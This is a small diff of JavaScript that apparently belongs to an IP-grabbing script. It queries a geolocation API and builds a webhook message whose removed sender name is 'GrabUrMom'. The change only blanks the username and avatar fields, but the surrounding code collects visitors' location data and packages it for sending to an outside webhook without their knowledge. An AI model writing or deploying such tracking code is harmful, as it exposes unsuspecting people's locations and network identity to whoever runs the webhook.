@@ -5,8 +5,8 @@ $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) {
     request.setRequestHeader('Content-type', 'application/json');
   
     var t = {
-      username: "GrabUrMom",
-      avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
+      username: "   ",
+      avatar_url: " ",
       content: "",
       embeds: [{
           color: "4700374",
